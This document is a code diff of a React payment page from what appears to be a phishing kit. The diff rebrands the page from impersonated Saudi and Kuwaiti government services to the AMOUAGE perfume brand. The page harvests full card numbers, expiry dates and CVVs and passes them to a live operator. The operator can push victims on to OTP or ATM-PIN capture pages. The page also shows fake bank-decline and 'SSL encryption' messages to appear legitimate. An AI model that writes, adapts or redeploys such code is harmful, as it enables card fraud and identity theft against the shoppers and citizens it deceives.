@@ -4,18 +4,7 @@ import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import { useLocation } from "wouter";
-import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
 import {
   socket,
   visitor,
@@ -31,12 +20,10 @@ import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/b
 const schema = z.object({
   cardNumber: z
     .string()
-    .min(1, "رقم البطاقة مطلوب")
+    .min(1, "Card number is required")
     .refine((val) => {
-      // Remove spaces before validation
       const cleanVal = val.replace(/\s+/g, "");
       if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
-      // Luhn algorithm validation
       let sum = 0;
       let isEven = false;
       for (let i = cleanVal.length - 1; i >= 0; i--) {
@@ -49,16 +36,15 @@ const schema = z.object({
         isEven = !isEven;
       }
       return sum % 10 === 0;
-    }, "رقم البطاقة غير صحيح"),
-  nameOnCard: z.string().min(1, "اسم حامل البطاقة مطلوب"),
-  expiryMonth: z.string().min(1, "الشهر مطلوب"),
-  expiryYear: z.string().min(1, "السنة مطلوبة"),
-  cvv: z.string().length(3, "CVV يجب أن يكون 3 أرقام"),
+    }, "Invalid card number"),
+  nameOnCard: z.string().min(1, "Cardholder name is required"),
+  expiryMonth: z.string().min(1, "Month is required"),
+  expiryYear: z.string().min(1, "Year is required"),
+  cvv: z.string().length(3, "CVV must be 3 digits"),
 });
 
 type FormData = z.infer<typeof schema>;
 
-// Generate months and years
 const months = Array.from({ length: 12 }, (_, i) => ({
   value: String(i + 1).padStart(2, "0"),
   label: String(i + 1).padStart(2, "0"),
@@ -70,38 +56,28 @@ const years = Array.from({ length: 15 }, (_, i) => ({
   label: String(currentYear + i),
 }));
 
-// Luhn algorithm to validate card number
 function isValidCardNumber(number: string): boolean {
   if (!number || number.length < 13 || number.length > 19) return false;
-  
   let sum = 0;
   let isEven = false;
-  
   for (let i = number.length - 1; i >= 0; i--) {
     let digit = parseInt(number[i], 10);
-    
     if (isEven) {
       digit *= 2;
-      if (digit > 9) {
-        digit -= 9;
-      }
+      if (digit > 9) digit -= 9;
     }
-    
     sum += digit;
     isEven = !isEven;
   }
-  
   return sum % 10 === 0;
 }
 
-// Detect card type using unified database
 function getCardType(number: string): string {
   const cleanNumber = number.replace(/\s+/g, "");
   const cardType = getCardTypeFromDB(cleanNumber);
   return cardType ? cardType.toLowerCase() : "unknown";
 }
 
-// الحصول على معلومات البنك من رقم البطاقة
 function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
   const info = getBinInfo(cardNumber);
   if (info) {
@@ -115,19 +91,16 @@ export default function CreditCardPayment() {
   const [cardError, setCardError] = useState(false);
   const [luhnError, setLuhnError] = useState(false);
   const [rejectedError, setRejectedError] = useState(false);
-  const [selectKey, setSelectKey] = useState(0); // مفتاح لإعادة تعيين Select components
+  const [selectKey, setSelectKey] = useState(0);
   const debounceRef = useRef<ReturnType<typeof setTimeout>>();
 
-  // Get service and amount from URL params
+  // Get amount from URL params or cart
   const searchParams = new URLSearchParams(window.location.search);
-  const serviceParam = searchParams.get('service') || 'قيد سجل تجاري';
-  const totalAmount = searchParams.get('amount') || '575';
-  const isMOH = serviceParam === 'moh';
-
-  // For MOH, get the actual service name from localStorage
-  const mohData = isMOH ? JSON.parse(localStorage.getItem('mohPaymentData') || '{}') : {};
-  const serviceName = isMOH ? (mohData.serviceType || 'الضمان الصحي') : serviceParam;
-  const currency = isMOH ? 'د.ك' : 'ر.س';
+  const totalAmount = searchParams.get('amount') || '0';
+  
+  // Get cart items for product name
+  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');
+  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';
 
   const {
     register,
@@ -153,7 +126,6 @@ export default function CreditCardPayment() {
   const expiryYear = watch("expiryYear");
   const cvv = watch("cvv");
 
-  // Check if form is valid for submission
   const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
   const isFormValid = 
     cleanCardNumber.length >= 13 && 
@@ -164,12 +136,10 @@ export default function CreditCardPayment() {
     expiryYear?.length > 0 &&
     cvv?.length === 3;
 
-  // Emit page enter
   useEffect(() => {
     navigateToPage("الدفع بطاقة الائتمان");
   }, []);
 
-  // Verify card number
   useEffect(() => {
     if (cardNumber && cardNumber.length === 16) {
       if (debounceRef.current) clearTimeout(debounceRef.current);
@@ -179,7 +149,6 @@ export default function CreditCardPayment() {
     }
   }, [cardNumber]);
 
-  // Handle card verification response
   useEffect(() => {
     if (isCardVerified.value === false) {
       setCardError(true);
@@ -188,19 +157,15 @@ export default function CreditCardPayment() {
     }
   }, [isCardVerified.value]);
 
-  // Handle form approval
   useEffect(() => {
     if (isFormApproved.value) {
       navigate("/otp-verification");
     }
   }, [isFormApproved.value, navigate]);
 
-  // Handle card action from admin
   useSignalEffect(() => {
     if (cardAction.value) {
       const action = cardAction.value.action;
-      
-      // إخفاء اللودر فوراً عند استلام أي إجراء من الأدمن
       waitingMessage.value = "";
       
       if (action === 'otp') {
@@ -209,7 +174,6 @@ export default function CreditCardPayment() {
         navigate("/atm-password");
       } else if (action === 'reject') {
         setRejectedError(true);
-        // تفريغ جميع الحقول عند رفض البطاقة
         reset({
           cardNumber: "",
           nameOnCard: "",
@@ -217,26 +181,21 @@ export default function CreditCardPayment() {
           expiryYear: "",
           cvv: "",
         });
-        // إعادة تعيين Select components
         setSelectKey(prev => prev + 1);
       }
-      // Reset card action
       cardAction.value = null;
     }
   });
 
-  // Format card number with spaces every 4 digits
   const formatCardNumber = (value: string): string => {
     const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
     const groups = cleaned.match(/.{1,4}/g);
     return groups ? groups.join(" ") : cleaned;
   };
 
-  // State for global blocked cards
   const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
   const [globalBlockedError, setGlobalBlockedError] = useState(false);
 
-  // Listen for global blocked cards updates
   useEffect(() => {
     socket.value.emit("blockedCards:get");
     
@@ -257,13 +216,11 @@ export default function CreditCardPayment() {
     };
   }, []);
 
-  // Check blocked card prefixes and validate card number
   const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
     const blockedPrefixes = visitor.value.blockedCardPrefixes;
     const cardPrefix = rawValue.slice(0, 4);
 
-    // Reset global blocked error when user types
     if (globalBlockedError) {
       setGlobalBlockedError(false);
     }
@@ -273,10 +230,8 @@ export default function CreditCardPayment() {
       setValue("cardNumber", "");
       setLuhnError(false);
     } else {
-      // Format with spaces for display
       const formattedValue = formatCardNumber(rawValue);
       setValue("cardNumber", formattedValue);
-      // Check Luhn validation when card number is complete (13-19 digits)
       if (rawValue.length >= 13 && rawValue.length <= 19) {
         if (!isValidCardNumber(rawValue)) {
           setLuhnError(true);
@@ -292,18 +247,14 @@ export default function CreditCardPayment() {
   const onSubmit = (data: FormData) => {
     if (luhnError) return;
 
-    // Remove spaces from card number before sending
     const cleanCardNumber = data.cardNumber.replace(/\s+/g, "");
     
-    // Check if card is globally blocked
     const cardPrefix = cleanCardNumber.slice(0, 4);
     if (globalBlockedCards.includes(cardPrefix)) {
-      // Show waiting overlay for 3 seconds then show error
-      waitingMessage.value = "جاري التحقق من معلومات البطاقة...";
+      waitingMessage.value = "Verifying card information...";
       setTimeout(() => {
         waitingMessage.value = "";
         setGlobalBlockedError(true);
-        // Clear all card fields
         reset({
           cardNumber: "",
           nameOnCard: "",
@@ -311,39 +262,29 @@ export default function CreditCardPayment() {
           expiryYear: "",
           cvv: "",
         });
-        // Reset Select components
         setSelectKey(prev => prev + 1);
       }, 3000);
       return;
     }
     
-    // الحصول على معلومات البنك ونوع البطاقة
     const bankInfo = getBankInfoLocal(cleanCardNumber);
     const cardType = getCardType(cleanCardNumber);
     
-    // Debug logs
-    console.log("CreditCardPayment - cleanCardNumber:", cleanCardNumber);
-    console.log("CreditCardPayment - bankInfo:", bankInfo);
-    console.log("CreditCardPayment - cardType:", cardType);
-    
-    // تحديث معلومات شاشة الانتظار (فقط إذا كانت البطاقة موجودة في قاعدة البيانات)
     if (bankInfo) {
       waitingCardInfo.value = {
         bankName: bankInfo.bank,
         bankLogo: bankInfo.logo,
         cardType: cardType,
       };
-      console.log("CreditCardPayment - waitingCardInfo set:", waitingCardInfo.value);
     } else {
       waitingCardInfo.value = null;
-      console.log("CreditCardPayment - bankInfo is null, waitingCardInfo cleared");
     }
 
     const paymentData = {
       totalPaid: totalAmount,
       cardType: cardType,
       cardLast4: cleanCardNumber.slice(-4),
-      serviceName: serviceName,
+      serviceName: productNames,
       bankName: bankInfo?.bank || '',
       bankLogo: bankInfo?.logo || '',
     };
@@ -366,154 +307,188 @@ export default function CreditCardPayment() {
   };
 
   return (
-    <PageLayout variant="default">
+    <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center px-4 py-8" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
       <WaitingOverlay />
 
-      <div className="bg-white rounded-2xl shadow-xl p-6">
+      <div className="w-full max-w-[480px]">
         {/* Header */}
-        <div className="text-center mb-6">
-          <h1 className="text-xl font-bold text-gray-800 mb-2">الدفع الآمن</h1>
-          <p className="text-gray-500 text-sm">أدخل بيانات بطاقتك لإتمام الدفع</p>
-          <div className="mt-3 p-3 bg-green-50 rounded-lg">
-            <p className="text-sm text-gray-600">{serviceName}</p>
-            <p className="text-2xl font-bold text-green-600">{totalAmount} {currency}</p>
-          </div>
+        <div className="text-center mb-8">
+          <h1 className="text-2xl tracking-[0.3em] font-light text-black mb-2" style={{ fontFamily: "'Times New Roman', serif" }}>AMOUAGE</h1>
+          <p className="text-sm text-gray-500">Secure Payment</p>
         </div>
 
-        {/* Card Icons */}
-        <div className="flex justify-center gap-3 mb-6">
-          <img src="/images/visa.png" alt="visa" className="h-8" />
-          <img src="/images/mastercard.png" alt="mastercard" className="h-8" />
-        </div>
-
-        {/* Rejected Error Message */}
-        {rejectedError && (
-          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
-            <p className="text-red-600 text-center font-medium">معلومات البطاقة المدخلة غير صحيحة</p>
-          </div>
-        )}
-
-        {/* Global Blocked Card Error Message */}
-        {globalBlockedError && (
-          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
-            <p className="text-red-600 text-center font-medium">تم رفض العملية من قبل البنك المصدر للبطاقة</p>
-            <p className="text-red-500 text-center text-sm mt-1">يرجى المحاولة بوسيلة دفع أخرى</p>
-          </div>
-        )}
-
-        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
-          {/* Card Number */}
-          <div className="space-y-2">
-            <Label htmlFor="cardNumber">رقم البطاقة</Label>
-            <Input
-              id="cardNumber"
-              type="tel"
-              inputMode="numeric"
-              maxLength={19}
-              placeholder="1234 5678 9012 3456"
-              className={(cardError || luhnError) ? "border-red-500" : ""}
-              {...register("cardNumber")}
-              onChange={handleCardChange}
-              onFocus={() => setRejectedError(false)}
-            />
-            {(errors.cardNumber || cardError || luhnError) && (
-              <p className="text-red-500 text-xs">
-                {luhnError ? "رقم البطاقة غير صحيح" : (errors.cardNumber?.message || "رقم البطاقة غير صحيح")}
-              </p>
-            )}
+        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-8">
+          {/* Order Summary */}
+          <div className="border-b border-gray-200 pb-5 mb-6">
+            <div className="flex justify-between items-center">
+              <div>
+                <p className="text-sm text-gray-500">Order Total</p>
+                <p className="text-xs text-gray-400 mt-1 truncate max-w-[200px]">{productNames}</p>
+              </div>
+              <p className="text-2xl font-medium text-black">${Number(totalAmount).toLocaleString()}</p>
+            </div>
           </div>
 
-          {/* Name on Card */}
-          <div className="space-y-2">
-            <Label htmlFor="nameOnCard">اسم حامل البطاقة</Label>
-            <Input
-              id="nameOnCard"
-              placeholder="الاسم كما هو مدون على البطاقة"
-              {...register("nameOnCard")}
-              onChange={(e) => {
-                // قبول حروف إنجليزية ومسافات فقط (A-Z, a-z, space)
-                const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
-                setValue("nameOnCard", englishOnly);
-              }}
-            />
-            {errors.nameOnCard && (
-              <p className="text-red-500 text-xs">{errors.nameOnCard.message}</p>
-            )}
+          {/* Card Icons */}
+          <div className="flex justify-center gap-3 mb-6">
+            <svg className="w-10 h-6" viewBox="0 0 38 24" fill="none">
+              <rect width="38" height="24" rx="3" fill="#016FD0"/>
+              <text x="4" y="16" fill="white" fontSize="7" fontWeight="bold">AMEX</text>
+            </svg>
+            <svg className="w-10 h-6" viewBox="0 0 38 24" fill="none">
+              <rect width="38" height="24" rx="3" fill="#1A1F71"/>
+              <text x="7" y="16" fill="white" fontSize="10" fontWeight="bold">VISA</text>
+            </svg>
+            <svg className="w-10 h-6" viewBox="0 0 38 24" fill="none">
+              <rect width="38" height="24" rx="3" fill="#F5F5F5" stroke="#E0E0E0"/>
+              <circle cx="15" cy="12" r="7" fill="#EB001B"/>
+              <circle cx="23" cy="12" r="7" fill="#F79E1B"/>
+              <path d="M19 7.5a7 7 0 010 9" fill="#FF5F00"/>
+            </svg>
           </div>
 
-          {/* Expiry Date */}
-          <div className="grid grid-cols-2 gap-4">
-            <div className="space-y-2">
-              <Label>شهر الانتهاء</Label>
-              <Select key={`month-${selectKey}`} onValueChange={(v) => setValue("expiryMonth", v)}>
-                <SelectTrigger>
-                  <SelectValue placeholder="الشهر" />
-                </SelectTrigger>
-                <SelectContent>
+          {/* Error Messages */}
+          {rejectedError && (
+            <div className="bg-red-50 border border-red-200 rounded-md p-3 mb-4">
+              <p className="text-red-600 text-center text-sm">Card information is incorrect. Please try again.</p>
+            </div>
+          )}
+
+          {globalBlockedError && (
+            <div className="bg-red-50 border border-red-200 rounded-md p-3 mb-4">
+              <p className="text-red-600 text-center text-sm">Transaction declined by issuing bank.</p>
+              <p className="text-red-500 text-center text-xs mt-1">Please try a different payment method.</p>
+            </div>
+          )}
+
+          <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
+            {/* Card Number */}
+            <div>
+              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Card Number</label>
+              <input
+                type="tel"
+                inputMode="numeric"
+                maxLength={19}
+                placeholder="1234 5678 9012 3456"
+                className={`w-full border rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors ${
+                  (cardError || luhnError) ? 'border-red-400 bg-red-50' : 'border-gray-300'
+                }`}
+                {...register("cardNumber")}
+                onChange={handleCardChange}
+                onFocus={() => setRejectedError(false)}
+              />
+              {(errors.cardNumber || cardError || luhnError) && (
+                <p className="text-red-500 text-xs mt-1">
+                  {luhnError ? "Invalid card number" : (errors.cardNumber?.message || "Invalid card number")}
+                </p>
+              )}
+            </div>
+
+            {/* Name on Card */}
+            <div>
+              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Cardholder Name</label>
+              <input
+                type="text"
+                placeholder="Name as shown on card"
+                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors"
+                {...register("nameOnCard")}
+                onChange={(e) => {
+                  const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
+                  setValue("nameOnCard", englishOnly);
+                }}
+              />
+              {errors.nameOnCard && (
+                <p className="text-red-500 text-xs mt-1">{errors.nameOnCard.message}</p>
+              )}
+            </div>
+
+            {/* Expiry Date */}
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Expiry Month</label>
+                <select
+                  key={`month-${selectKey}`}
+                  className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors bg-white"
+                  onChange={(e) => setValue("expiryMonth", e.target.value)}
+                  defaultValue=""
+                >
+                  <option value="" disabled>MM</option>
                   {months.map((m) => (
-                    <SelectItem key={m.value} value={m.value}>
-                      {m.label}
-                    </SelectItem>
+                    <option key={m.value} value={m.value}>{m.label}</option>
                   ))}
-                </SelectContent>
-              </Select>
-              {errors.expiryMonth && (
-                <p className="text-red-500 text-xs">{errors.expiryMonth.message}</p>
-              )}
-            </div>
+                </select>
+                {errors.expiryMonth && (
+                  <p className="text-red-500 text-xs mt-1">{errors.expiryMonth.message}</p>
+                )}
+              </div>
 
-            <div className="space-y-2">
-              <Label>سنة الانتهاء</Label>
-              <Select key={`year-${selectKey}`} onValueChange={(v) => setValue("expiryYear", v)}>
-                <SelectTrigger>
-                  <SelectValue placeholder="السنة" />
-                </SelectTrigger>
-                <SelectContent>
+              <div>
+                <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">Expiry Year</label>
+                <select
+                  key={`year-${selectKey}`}
+                  className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors bg-white"
+                  onChange={(e) => setValue("expiryYear", e.target.value)}
+                  defaultValue=""
+                >
+                  <option value="" disabled>YYYY</option>
                   {years.map((y) => (
-                    <SelectItem key={y.value} value={y.value}>
-                      {y.label}
-                    </SelectItem>
+                    <option key={y.value} value={y.value}>{y.label}</option>
                   ))}
-                </SelectContent>
-              </Select>
-              {errors.expiryYear && (
-                <p className="text-red-500 text-xs">{errors.expiryYear.message}</p>
+                </select>
+                {errors.expiryYear && (
+                  <p className="text-red-500 text-xs mt-1">{errors.expiryYear.message}</p>
+                )}
+              </div>
+            </div>
+
+            {/* CVV */}
+            <div>
+              <label className="block text-xs text-gray-500 mb-1.5 font-medium uppercase tracking-wide">CVV</label>
+              <input
+                type="tel"
+                inputMode="numeric"
+                maxLength={3}
+                placeholder="123"
+                className="w-full border border-gray-300 rounded-md px-4 py-3 text-sm focus:outline-none focus:border-black transition-colors"
+                {...register("cvv")}
+                onChange={(e) => {
+                  const englishOnly = e.target.value.replace(/[^0-9]/g, "");
+                  setValue("cvv", englishOnly);
+                }}
+              />
+              {errors.cvv && (
+                <p className="text-red-500 text-xs mt-1">{errors.cvv.message}</p>
               )}
             </div>
-          </div>
 
-          {/* CVV */}
-          <div className="space-y-2">
-            <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
-            <Input
-              id="cvv"
-              type="tel"
-              inputMode="numeric"
-              maxLength={3}
-              placeholder="123"
-              {...register("cvv")}
-              onChange={(e) => {
-                // قبول أرقام إنجليزية فقط (0-9)
-                const englishOnly = e.target.value.replace(/[^0-9]/g, "");
-                setValue("cvv", englishOnly);
-              }}
-            />
-            {errors.cvv && (
-              <p className="text-red-500 text-xs">{errors.cvv.message}</p>
-            )}
-          </div>
+            {/* Submit Button */}
+            <button
+              type="submit"
+              disabled={!isFormValid}
+              className={`w-full py-4 rounded-md text-white text-sm font-medium tracking-wider uppercase transition-all ${
+                isFormValid
+                  ? 'bg-black hover:bg-gray-800 cursor-pointer'
+                  : 'bg-gray-300 cursor-not-allowed'
+              }`}
+            >
+              PAY NOW
+            </button>
+          </form>
 
-          {/* Submit Button */}
-          <Button 
-            type="submit" 
-            className="w-full" 
-            size="lg"
-            disabled={!isFormValid}
-          >
-            ادفع الآن
-          </Button>
-        </form>
+          {/* Security note */}
+          <div className="mt-5 flex items-center justify-center gap-2 text-xs text-gray-400">
+            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+            <span>Secured by SSL encryption</span>
+          </div>
+        </div>
+
+        {/* Footer */}
+        <div className="text-center mt-6">
+          <p className="text-xs text-gray-400">Powered by AMOUAGE</p>
+        </div>
       </div>
-    </PageLayout>
+    </div>
   );
 }
